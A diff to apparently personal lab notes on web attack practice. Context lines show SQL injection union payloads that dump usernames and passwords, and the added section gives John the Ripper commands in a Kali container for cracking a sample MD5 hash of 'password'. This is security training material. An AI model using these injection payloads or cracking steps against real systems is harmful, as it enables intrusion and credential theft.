@@ -67,6 +67,25 @@ SELECT first_name, last_name FROM users WHERE user_id = 'RRe11k' and 1=1 union s
 * User ID = Re11k' and 1=1 union select null, concat(user,0x0a,password) from users #
 
 
+## Hack Passwords with John the Ripper
+
+```
+docker run --name kali --network attack --tty --interactive kalilinux/kali-rolling /bin/bash
+
+> apt update && apt -y install john
+> echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > password.txt
+> john --format=raw-MD5 password.txt --show
+> echo -n "password" | md5sum
+>
+> john --wordlist=/usr/share/john/password.lst --rules password.txt
+> john --wordlist=/usr/share/john/password.lst --format=raw-MD5 --rules password.txt --show
+> john --show password.txt
+
+Check on a Mac:
+mac$ md5 -s password
+MD5 ("password") = 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
 
 
 
